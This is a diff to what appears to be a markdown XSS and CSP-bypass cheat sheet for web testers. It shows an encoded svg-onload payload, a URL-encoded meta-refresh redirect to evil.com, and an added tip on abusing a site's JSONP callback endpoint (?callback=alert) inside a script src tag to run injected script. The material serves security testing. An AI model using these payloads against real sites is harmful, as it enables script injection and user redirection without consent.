@@ -112,7 +112,9 @@ E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert
   https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt <br>
   <br>
   Check if you can insert a open redirect via meta tag <br>
-  %3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttps://evil.com%22%3E![image](https://user-images.githubusercontent.com/35967437/185359562-32aa1011-c7fa-4ba5-8bf4-ae256f15fc1a.png)
+  %3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Dhttps://evil.com%22%3E <br>
+  <br>
+  Does the site have it's own callback url? If you can get tag injection with a script somewhere but it wont execute, use the callback endpoint of the site ?callback=alert("xss") within a script src tag
 
 <br>
  <h3> XSS within Variables and scripts</h3>
